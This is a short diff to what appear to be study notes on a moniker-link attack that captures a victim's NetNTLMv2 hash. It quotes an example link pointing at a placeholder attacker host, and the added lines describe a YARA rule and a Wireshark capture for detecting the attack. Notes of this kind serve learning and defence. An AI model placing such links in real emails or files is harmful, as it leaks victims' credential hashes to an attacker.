@@ -280,5 +280,8 @@ ex): <a href="file://ATTACKER_IP/test!exploit>Click me</a>.
 by these sequences, attacker can get victim's 'NetNTLMv2 hash'. so attacker can authentificate victim's account. 
 *NetNTLMv2 hash: used for network authentification
 
+YARA rule created to detect emails containing file:\\ element in the moniker link.
+the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.(by WireShark)
+
 
 
